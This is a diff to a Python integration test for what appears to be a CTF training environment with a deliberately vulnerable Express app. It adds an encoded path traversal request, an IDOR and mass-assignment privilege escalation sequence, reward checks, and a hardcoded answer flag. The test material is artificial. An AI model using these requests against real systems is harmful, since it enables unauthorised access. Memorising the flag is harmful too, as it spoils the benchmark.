@@ -2,7 +2,8 @@
 Integration test via the /mcp WebSocket endpoint.
 This tests the full exploit chain using persistent MCP sessions.
 
-Tests all 10 tasks against the Node.js/Express vulnerable app.
+Tests 7 exploit tasks plus one reward-progression check against the
+Node.js/Express vulnerable app.
 """
 import asyncio
 import json
@@ -54,6 +55,15 @@ def parse_tool_result(resp):
         except json.JSONDecodeError:
             return {"raw": result}
     return {"raw": str(result)}
+
+
+def unwrap_tool_result(result):
+    """Extract plain tool data from OpenEnv/FastMCP wrappers."""
+    if hasattr(result, "data"):
+        return result.data
+    if isinstance(result, dict) and "data" in result:
+        return result["data"]
+    return result
 
 
 # ─────────────────────────────────────────────
@@ -365,12 +375,12 @@ async def test_path_traversal():
             assert result.get("lines", 0) > 0
 
             # Path traversal to read flag.txt
-            print("[3] Path traversal: GET /api/files/flag.txt...")
+            print("[3] Path traversal: GET /api/files/..%2fflag.txt...")
             resp = await mcp_ws_call(ws, "tools/call", {
                 "name": "http_request",
                 "arguments": {
                     "method": "GET",
-                    "path": "/api/files/flag.txt"
+                    "path": "/api/files/..%2fflag.txt"
                 }
             }, req_id=3)
             result = parse_tool_result(resp)
@@ -638,10 +648,99 @@ async def test_command_injection():
         return False
 
 
-async def main():
-    passed = 0
-    total = 7
+async def test_partial_reward_progression():
+    """Verify that step rewards expose partial grading before flag submission."""
+    from client import CtfEnv
+    from openenv.core.env_server.mcp_types import CallToolAction, CallToolObservation
 
+    print("\n" + "=" * 60)
+    print("TEST: Partial Reward Progression")
+    print("=" * 60)
+
+    async def call_tool(env, name, **kwargs):
+        step_result = await env.step(CallToolAction(tool_name=name, arguments=kwargs))
+        observation = step_result.observation
+        result = unwrap_tool_result(
+            observation.result if isinstance(observation, CallToolObservation) else None
+        )
+        return step_result, result
+
+    try:
+        async with CtfEnv(base_url="http://localhost:8000") as env:
+            await env.reset(task="idor_privesc")
+
+            print("\n[1] Reading task source...")
+            step_result, _ = await call_tool(env, "view_source", file_path="src/routes/users.js")
+            source_reward = step_result.reward or 0.0
+            assert source_reward > 0.0, f"Expected partial reward for source read, got {source_reward}"
+
+            print("[2] Registering user...")
+            step_result, result = await call_tool(
+                env,
+                "http_request",
+                method="POST",
+                path="/api/auth/register",
+                body={
+                    "username": "reward_tester_99",
+                    "password": "secret",
+                    "email": "reward@test.local",
+                },
+            )
+            register_reward = step_result.reward or 0.0
+            assert register_reward > 0.0, f"Expected partial reward for registration, got {register_reward}"
+            token = result.get("body", {}).get("token", "")
+            user_id = result.get("body", {}).get("user", {}).get("id")
+
+            print("[3] Exploiting IDOR...")
+            step_result, _ = await call_tool(
+                env,
+                "http_request",
+                method="GET",
+                path="/api/users/1",
+                headers={"Authorization": f"Bearer {token}"},
+            )
+            idor_reward = step_result.reward or 0.0
+            assert idor_reward > 0.0, f"Expected partial reward for IDOR, got {idor_reward}"
+
+            print("[4] Escalating privileges...")
+            step_result, _ = await call_tool(
+                env,
+                "http_request",
+                method="PUT",
+                path=f"/api/users/{user_id}",
+                body={"role": "admin"},
+                headers={"Authorization": f"Bearer {token}"},
+            )
+            privesc_reward = step_result.reward or 0.0
+            assert privesc_reward > 0.0, f"Expected partial reward for privilege escalation, got {privesc_reward}"
+            assert step_result.done is False, "Episode should not finish before flag submission"
+
+            print("[5] Submitting final flag...")
+            step_result, result = await call_tool(
+                env,
+                "submit_flag",
+                flag="FLAG{mass_assignment_privesc_2024}",
+            )
+            final_score = result.get("score")
+            assert step_result.done is True, "Episode should finish on correct flag submission"
+            assert final_score == 1.0, f"Expected final score 1.0, got {final_score}"
+
+            print(
+                "    Intermediate rewards:",
+                [round(value, 2) for value in (source_reward, register_reward, idor_reward, privesc_reward)],
+            )
+            print(f"    Final score: {final_score}")
+            print("    PASS: Partial Reward Progression")
+            return True
+
+    except Exception as e:
+        print(f"    FAIL: {e}")
+        import traceback
+        traceback.print_exc()
+        return False
+
+
+async def main():
     tests = [
         ("SQLi Login", test_sqli),
         ("IDOR Privesc", test_idor),
@@ -650,7 +749,10 @@ async def main():
         ("Stored XSS", test_xss),
         ("UNION SQLi", test_sqli_union),
         ("Command Injection", test_command_injection),
+        ("Partial Reward Progression", test_partial_reward_progression),
     ]
+    passed = 0
+    total = len(tests)
 
     for name, test_fn in tests:
         try:
